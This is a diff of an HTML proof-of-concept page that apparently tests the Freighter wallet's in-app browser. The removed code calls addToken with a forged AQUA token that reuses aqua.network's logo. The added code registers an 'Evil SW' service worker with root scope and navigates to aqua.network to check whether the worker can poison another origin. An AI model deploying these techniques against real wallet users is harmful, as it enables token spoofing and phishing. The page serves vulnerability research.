@@ -1,39 +1,61 @@
 <!DOCTYPE html>
-<html><body>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SW Cross-Origin Poison - Freighter Test</title>
+<style>body{font-family:monospace;padding:15px;background:#111;color:#0f0} button{padding:12px;width:100%;margin:5px 0;background:#0f0;color:#000;font-weight:bold} pre{background:#222;padding:10px;white-space:pre-wrap;word-break:break-all}</style>
+</head>
+<body>
+<h2>SW Cross-Origin Poison Test</h2>
+<p>Origin: <b id=origin></b></p>
 <pre id=log></pre>
+
+<button onclick="registerSW()">1. Register Evil SW from 0x403for</button>
+<button onclick="checkSW()">2. Check SW Registration</button>
+<button onclick="goAqua()">3. Navigate to aqua.network (test poison)</button>
+<button onclick="clearSW()">Clear SW (cleanup)</button>
+
 <script>
-function log(t){document.getElementById('log').innerText+=t+'\n'}
+const logEl = document.getElementById('log');
+function log(t){ logEl.textContent += t+'\n'; console.log(t); }
+document.getElementById('origin').textContent = location.origin;
+log('Page loaded: '+location.href);
 
-async function test(){
-  log('Origin: '+location.origin);
-  // tunggu 3 detik inject
-  for(let i=0;i<10;i++){
-    let api = window.freighterApi || window.freighter || window.stellar || window.Freighter;
-    if(api){ log('FOUND: '+Object.keys(api).join(',')); break; }
-    log('waiting inject... '+i); await new Promise(r=>setTimeout(r,300));
+async function registerSW(){
+  log('\n--- Registering SW ---');
+  try{
+    let reg = await navigator.serviceWorker.register('/sw.js', {scope:'/'});
+    log('SW Registered: '+reg.scope);
+    await navigator.serviceWorker.ready;
+    log('SW READY - Active: '+navigator.serviceWorker.controller);
+    log('Now click button 3 to navigate to aqua.network');
+  }catch(e){
+    log('Register ERR: '+e.message);
+    try{
+      let reg2 = await navigator.serviceWorker.register('./sw.js', {scope:'./'});
+      log('Fallback SW Registered: '+reg2.scope);
+    }catch(e2){ log('Fallback ERR: '+e2.message); }
   }
-
-  let api = window.freighterApi || window.freighter || window.stellar;
-  if(!api){ 
-    log('NOT FOUND after 3s - Freighter whitelist bug!'); 
-    log('Try buka via https://play.freighter.app/?url='+location.href);
-    return;
-  }
-
-  // SAFE TEST - REAL vs FAKE AQUA same symbol
-  let real = {code:"AQUA", issuer:"GBNZILSTVQZ4R7IKQDGHYGY2HT5Q2QYMCHZECHUCBZ5QSE7F3N5TA2AQUA", domain:"aqua.network"};
-  let fake = {code:"AQUA", issuer:"GDXNFAKE0x403forTEST1234567890", domain:"0x403for.github.io", image:"https://aqua.network/favicon.png"};
-
-  log('Calling addToken REAL: '+JSON.stringify(real));
-  try{ let r=await api.addToken(real); log('REAL result: '+JSON.stringify(r)); }catch(e){ log('REAL err: '+e.message); }
-
-  log('Calling addToken FAKE same logo: '+JSON.stringify(fake));
-  try{ let r=await api.addToken(fake); log('FAKE result: '+JSON.stringify(r)); 
-    log('BUG if no warning issuer diff'); 
-  }catch(e){ log('FAKE err (secure): '+e.message); }
 }
 
-window.addEventListener('freighterApiReady', test);
-window.onload = ()=>setTimeout(test,1000);
+async function checkSW(){
+  let regs = await navigator.serviceWorker.getRegistrations();
+  log('\n--- SW Registrations: '+regs.length+' ---');
+  regs.forEach(r=>log('Scope: '+r.scope+' | Active: '+!!r.active));
+  log('Controller: '+(navigator.serviceWorker.controller ? navigator.serviceWorker.controller.scriptURL : 'none'));
+}
+
+function goAqua(){
+  log('\n--- Navigating to aqua.network ---');
+  log('If Single WebView bug, aqua.network will be served by 0x403for SW');
+  location.href = 'https://aqua.network';
+}
+
+async function clearSW(){
+  let regs = await navigator.serviceWorker.getRegistrations();
+  for(let r of regs){ await r.unregister(); }
+  log('All SW unregistered');
+}
 </script>
-</body></html>
+</body>
+</html>
